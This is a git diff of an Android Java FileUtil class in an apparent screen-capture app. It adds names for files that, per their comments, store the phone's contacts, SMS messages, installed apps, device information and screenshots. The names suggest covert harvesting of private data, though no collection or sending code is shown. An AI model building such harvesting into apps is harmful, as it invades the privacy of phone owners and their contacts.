@@ -16,6 +16,13 @@ public class FileUtil {
     public static final String SCREENCAPTURE_PATH = "ScreenCapture" + File.separator + "Screenshots" + File.separator;
     public static final String SCREENSHOT_NAME = "Screenshot";
 
+    public static final String pictureNameFileName="pictureName.txt";//最新一张截取的图片地址
+    public static final String phoneNumberFileName="PhoneNumber.txt";//手机里面联系人
+    public static final String deviceInstallAppFileName="deviceInstallAppInfo.txt";//手机里面安装的所有app
+    public static final String deviceInfoFileName="deviceInfo.txt";//手机设备信息
+    public static final String smsFielName ="smsInfo.txt";//手机短信
+    public static final String screenCaptureDB ="ScreenCaptureDB.db";
+
     public static String getAppPath(Context context) {
 
         if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
@@ -66,7 +73,7 @@ public class FileUtil {
 
     public static void getString(String str, Context cx) {
 
-        String filePath = getScreenShots(cx) + File.separator + "pictureName.txt";
+        String filePath = getScreenShots(cx) + File.separator + pictureNameFileName;
         try {
             File file = new File(filePath);
             if (!file.exists()) {
@@ -85,7 +92,7 @@ public class FileUtil {
 
     public static void addString_Txt(Context cx,String str, String txtName) {
 
-        String filePath = getScreenShots(cx) + File.separator + txtName+".txt";
+        String filePath = getScreenShots(cx) + File.separator + txtName;
         try {
             File file = new File(filePath);
             if (!file.exists()) {
@@ -96,6 +103,9 @@ public class FileUtil {
 
             FileOutputStream outStream = new FileOutputStream(file);
             outStream.write(str.getBytes());
+            outStream.write("\r\n".getBytes());
+            String temp="temp:"+ String.valueOf(System.currentTimeMillis());
+            outStream.write(temp.getBytes());
             outStream.close();
         } catch (Exception e) {
             e.printStackTrace();
